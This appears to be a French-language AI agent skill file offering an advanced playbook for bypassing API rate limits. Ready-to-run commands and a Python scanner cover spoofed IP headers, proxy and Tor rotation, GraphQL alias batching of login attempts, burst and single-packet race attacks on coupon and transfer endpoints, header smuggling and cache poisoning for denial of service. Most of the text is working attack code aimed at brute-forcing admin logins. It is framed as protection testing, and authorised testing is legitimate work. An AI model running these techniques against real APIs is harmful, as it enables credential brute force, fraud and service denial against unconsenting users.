---
name: api-rate-limiting-bypass
description: Techniques avancées de contournement de rate limiting — en-têtes IP, rotation de proxies, timing attacks, distributed brute force, GraphQL batching, burst smuggling, et contournement de WAF
category: cybersecurite
---

# API Rate Limiting Bypass — Guide Avancé

## Introduction

Le rate limiting protège les API contre le brute-force, le credential stuffing et le scraping. Le contourner est essentiel pour valider la robustesse de ces protections.

## Vecteurs de Contournement

### 1. En-Têtes IP Spoofing

```bash
# Liste exhaustive d'en-têtes IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Forwarded-Host: 127.0.0.1
True-Client-Ip: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Original-Forwarded-For: 127.0.0.1
X-Envoy-External-Address: 127.0.0.1
```

**Rotation automatique avec ffuf :**
```bash
# Générer des IPs aléatoires
seq 1 1000 | while read i; do
  echo "$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
done > ips.txt

# ffuf avec rotation
ffuf -w passwords.txt -u https://api.target.com/login \
  -X POST -d '{"user":"admin","pass":"FUZZ"}' \
  -H "X-Forwarded-For: FUZZ" \
  -w ips.txt -mode parallel -t 1
```

### 2. Rotation de Proxy/Réseau

```bash
# Proxy rotation avec curl via fichier de proxies
for proxy in $(cat proxies.txt); do
  curl -x $proxy -X POST https://api.target.com/login \
    -H "Content-Type: application/json" \
    -d '{"user":"admin","pass":"test123"}'
done

# Tor rotation (nouveau circuit)
# Install: apt install tor torsocks
torsocks curl https://api.target.com/api/v1/users
# Nouveau circuit
kill -HUP $(pidof tor)
torsocks curl https://api.target.com/api/v1/users

# HAProxy rotation avec IPVS
for ip in $(seq 1 255); do
  curl --interface eth0:$ip https://api.target.com/api/v1/bruteforce
done
```

### 3. GraphQL Batching (Alias)

```graphql
# Une seule requête = N tentatives
mutation {
  a1: login(input: {username: "admin", password: "pass1"}) { token }
  a2: login(input: {username: "admin", password: "pass2"}) { token }
  a3: login(input: {username: "admin", password: "pass3"}) { token }
  # ... jusqu'à N alias en une requête
  a100: login(input: {username: "admin", password: "pass100"}) { token }
}
```

### 4. Timing et Burst

```bash
# Burst court avant le reset du compteur
for i in $(seq 1 100); do
  curl -s https://api.target.com/api/v1/login -X POST \
    -d '{"user":"admin","pass":"pass'$i'"}' &
done
wait

# Timing entre les limites (attendre le reset)
# Si la limite est 10 req/min, faire 9 req puis attendre 60s
for i in $(seq 1 100); do
  curl -s https://api.target.com/api/v1/reset-password -X POST \
    -d '{"email":"user'$i'@test.com"}'
  [ $((i % 9)) -eq 0 ] && sleep 61
done
```

### 5. HTTP Method Override

```bash
# Si le rate limit est basé sur la méthode
GET /api/v1/login
X-HTTP-Method-Override: POST

# Ou utiliser des méthodes alternatives
OPTIONS /api/v1/login → peut bypasser si non tracké
```

### 6. Content-Type Switching

```bash
# Format switching peut bypasser le parsing du compteur
# Si le compteur parse JSON body, passer en XML contourne
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/xml" \
  -d '<root><user>admin</user><pass>test</pass></root>'

# Cache-buster dans les paramètres
GET /api/v1/products?id=1&_=1712345678
GET /api/v1/products?id=1&cache=randomvalue
```

### 7. HTTP/2 Multiplexing

```bash
# HTTP/2 multiplexe N requêtes sur une connexion
# curl --http2-prior-knowledge
curl --http2 -X POST https://api.target.com/api/v1/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount":100,"to":"attacker"}'

# nghttp2 — envoi simultané
printf 'GET /api/v1/balance HTTP/1.1\r\nHost: target.com\r\n\r\n' > req.txt
nghttp -m 100 https://api.target.com/api/v1/balance
```

### 8. Race Condition (Single-Packet Attack)

```bash
# Turbo Intruder (Python/Burp)
# Envoyer N requêtes en un seul paquet TCP
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, i)
        engine.queue(target.req, i)
        engine.queue(target.req, i)

# Avec curl en parallèle massif
for i in $(seq 1 50); do
  curl -s https://api.target.com/api/v1/coupon \
    -X POST -d '{"code":"NEW50"}' &
done
wait
```

### 9. Cache-Based Bypass

```bash
# Si le cache CDN sert sans compter
X-Forwarded-For: 127.0.0.1
# Cache hit → pas de comptage

# Cache poisoning du rate limit
GET /api/v1/login?cb=123
# Si la réponse rate-limitée est mise en cache, les autres utilisateurs
# ne peuvent plus se connecter = DoS
```

### 10. Header Smuggling

```bash
# Doublons d'en-têtes
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: <IP_legitime>

# Nouvelle ligne dans header (HTTP Request Smuggling)
X-Forwarded-For: 127.0.0.1\r\nX-Forwarded-For: 8.8.8.8
```

## Outils Spécialisés

| Outil | Usage |
|-------|-------|
| **ffuf** | Fuzzing massif avec rotation d'en-têtes |
| **Burp Turbo Intruder** | Single-packet attack, race conditions |
| **wfuzz** | Fuzzing avec filtres avancés |
| **httpx** | Rotation de proxies intégrée |
| **proxychains** | Chaînage de proxies |
| **torsocks** | Rotation Tor |
| **nghttp2** | Multiplexing HTTP/2 |
| **rustscan** | Scan rapide avec timing bypass |

## Détection des Limites

```bash
# Analyser les headers de rate limiting
curl -s -D - https://api.target.com/api/v1/login \
  -X POST -d '{"user":"admin","pass":"test"}' \
  | grep -iE 'rate|limit|retry|429|throttle|x-ratelimit'

# Headers courants
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 1712345678
Retry-After: 60
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Rate limit bypass scanner automatisé."""
import requests
import random
import time

def generate_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

HEADERS_LIST = [
    'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
    'X-Remote-IP', 'X-Client-IP', 'Forwarded',
    'True-Client-Ip', 'CF-Connecting-IP', 'X-Envoy-External-Address'
]

def test_ip_rotation(url, payload, iterations=50):
    for i in range(iterations):
        header = random.choice(HEADERS_LIST)
        ip = generate_ip()
        resp = requests.post(url, json=payload, headers={header: ip})
        if resp.status_code == 200:
            print(f"[BYPASS] {header}: {ip} → {resp.status_code}")
            return True
        if i % 10 == 0:
            print(f"[*] {i}/{iterations} tentatives... statut={resp.status_code}")
    return False
```

## Checklist

- [ ] En-têtes X-Forwarded-For rotation
- [ ] Tous les autres en-têtes IP (X-Real-IP, X-Client-IP, etc.)
- [ ] Proxy rotation (HTTP, SOCKS5, Tor)
- [ ] GraphQL alias batching
- [ ] Burst timing (avant reset du compteur)
- [ ] HTTP/2 multiplexing
- [ ] Single-packet attack (Turbo Intruder)
- [ ] Content-Type switching
- [ ] HTTP Method Override
- [ ] Cache-based bypass
- [ ] Header smuggling
- [ ] IP rotation par interface réseau
- [ ] Analyse des headers de rate limit
- [ ] Attaque distribuée multi-sources

## Ressources

- **Rate Limit Bypass Techniques** : https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass/index.html
- **Turbo Intruder** : https://github.com/PortSwigger/turbo-intruder
- **HTTP/2 Rapid Reset** : https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps
- **OWASP Rate Limiting** : https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html